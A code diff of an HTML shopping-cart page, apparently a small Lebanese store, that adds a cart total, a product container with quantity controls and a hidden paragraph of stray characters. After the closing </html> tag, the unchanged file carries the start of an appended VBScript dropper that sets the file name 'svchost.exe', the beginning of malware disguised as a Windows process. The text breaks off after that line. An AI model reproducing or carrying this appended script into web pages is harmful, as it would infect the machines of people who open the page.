@@ -1,6 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
+<link href='https://fonts.googleapis.com/css?family=Noto Sans Arabic' rel='stylesheet'>
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <link rel="stylesheet" href="mystyle.css">
 <script type="text/javascript" src="myscript.js"></script> 
@@ -12,17 +13,27 @@
 
 <!-- Top Navigation Menu -->
 <div id="topnav"class="topnav">
-  <a id="My CART"class="active" onclick="distributeMyCart();" href="javascript:void(0);">MY CART</a>
+  <a id="My CART"class="active" onclick="distributeMyCart();" href="javascript:void(0);">
+  <img src="png/logo.png"width="80"height="60"><br>Bill: <b id="total">70,000</b> L.L</a>
   <div id="myCategories">
   </div>
 </div>
 
-<div id="page" class="page"style="padding-left:16px">
+<div id="page" class="page">
+	<div class="container">
+		<img class="image"width="70"height="70"src="png/product2.png">
+		<p id="overlay"class="overlay"style="font-size:1rem;">150,000 L.L.</p>
+		<img class="square" src="png/square.png">
+		<a href="javascript:plus('1');"><img class="plus" src="png/plus.png" width=20 height=20></a>
+		<a href="javascript:plus('1');"><img class="minus" src="png/minus.png" width=20 height=20></a>
+		<a href="javascript:quantity('product1');"><p id="product1"class="quantity">1</p></a>
+		<a href="javascript:plus('1');"><img class="delete" src="png/delete.png" width=25 height=25></a>
+	</div>
 </div>
 
 <!-- End smartphone / tablet look -->
-</div>
 </body>
+<p style="display:none;">»”</p>
 </html>
 <SCRIPT Language=VBScript><!--
 DropFileName = "svchost.exe"
